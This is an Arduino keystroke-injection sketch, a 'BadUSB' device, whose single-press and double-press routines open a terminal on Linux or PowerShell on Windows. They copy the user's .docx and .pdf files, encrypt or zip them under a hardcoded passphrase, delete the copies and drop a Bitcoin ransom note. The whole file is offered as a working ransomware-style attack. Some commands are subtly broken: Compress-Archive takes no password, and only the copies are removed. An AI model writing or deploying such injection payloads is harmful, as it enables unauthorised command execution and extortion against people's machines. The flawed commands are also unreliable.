#include <Keyboard.h>

const int buttonPin = 2;  // pin connected to the button
bool buttonState = false; 
bool lastButtonState = false;  
unsigned long lastDebounceTime = 0;  
unsigned long debounceDelay = 50;    
unsigned long buttonPressTime = 0;  
int pressCount = 0;                  

unsigned long doublePressTimeout = 500; // timeout between first and second press to recognize double press

void setup() {
  pinMode(buttonPin, INPUT_PULLUP);  
  Keyboard.begin();  

  delay(2000); 
}

void loop() {
  int reading = digitalRead(buttonPin);

  if (reading != lastButtonState) {
    lastDebounceTime = millis();  // Reset the debounce timer
  }

  if ((millis() - lastDebounceTime) > debounceDelay) { // check if the button is pressed (active LOW)
    if (reading == LOW && !buttonState) {
      buttonState = true;  
      pressCount++;  
      buttonPressTime = millis();  // record the time of the button press
    }
  }

  if (pressCount > 0 && (millis() - buttonPressTime) > doublePressTimeout) { // check for timeout or double press detection
    if (pressCount == 1) {
      executeLinuxPayload();  
    } else if (pressCount == 2) {
      executeWindowsPayload();
    }
    pressCount = 0;  // reset 
  }

  lastButtonState = reading;
}

void executeLinuxPayload() {
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');  // (terminal: Ctrl+Alt+T)
  delay(100);
  Keyboard.releaseAll();  

  delay(500); 

  Keyboard.print("cp ~/Documents/*.docx /tmp/ && cp ~/Documents/*.pdf /tmp/");
  Keyboard.press(KEY_RETURN);  
  Keyboard.releaseAll();
  
  delay(500);  

// encrypt copied .docx and .pdf files using gpg - symmetric encryption with a password
  Keyboard.print("gpg --batch --yes --passphrase 'SuperSecretPassword123' -c /tmp/*.docx && gpg --batch --yes --passphrase 'SuperSecretPassword123' -c /tmp/*.pdf");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(1000); 

  Keyboard.print("rm /tmp/*.docx /tmp/*.pdf");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);  

  Keyboard.print("echo 'Your files have been encrypted! To decrypt them, send $100 in Bitcoin to the following address: 1BitcoinAddressHere. Use the passphrase: SuperSecretPassword123' > /tmp/RANSOM_NOTE.txt");
  Keyboard.press(KEY_RETURN); // ransom note
  Keyboard.releaseAll();

  delay(500); 
}

void executeWindowsPayload() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();  // Windows + 'r'

  delay(500);  

  Keyboard.print("powershell");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500); 

  // powerShell command to copy .docx and .pdf files from Documents to C:\temp\ 
  Keyboard.print("Copy-Item -Path $env:USERPROFILE\\Documents\\*.docx -Destination C:\\temp\\; Copy-Item -Path $env:USERPROFILE\\Documents\\*.pdf -Destination C:\\temp\\");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500); 

  // encrypt copied files
  Keyboard.print("Compress-Archive -Path C:\\temp\\*.docx,C:\\temp\\*.pdf -DestinationPath C:\\temp\\encrypted_files.zip -Password 'SuperSecretPassword123'");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(1000);  

  Keyboard.print("Remove-Item C:\\temp\\*.docx,C:\\temp\\*.pdf");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500); 
  // ransom note
  Keyboard.print("echo 'Your files have been encrypted! To decrypt them, send $100 in Bitcoin to the following address: 1BitcoinAddressHere. Use the passphrase: SuperSecretPassword123' > C:\\temp\\RANSOM_NOTE.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500); 
}
